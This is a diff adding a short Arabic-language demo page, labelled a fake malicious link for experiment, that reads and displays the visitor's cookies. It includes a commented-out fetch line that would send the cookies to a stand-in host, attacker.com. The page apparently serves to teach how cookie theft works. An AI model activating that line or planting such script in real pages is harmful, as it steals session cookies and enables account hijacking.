@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>لينك خبيث وهمي (تجربة)</title>
+</head>
+<body>
+  <h2>😈 جاري تشغيل الكود الملغّم...</h2>
+
+  <script>
+    // محاكاة كود خبيث يطبع الكوكيز
+    const sessionCookies = document.cookie;
+
+    // نعرضها على الصفحة
+    document.body.innerHTML += "<p><strong>الكوكيز الموجودة:</strong> " + sessionCookies + "</p>";
+
+    // تخيل إنه هيبعته لسيرفر المخترق (مش هنفعل الكود ده)
+    // fetch("https://attacker.com/steal?cookie=" + encodeURIComponent(sessionCookies));
+  </script>
+</body>
+</html>
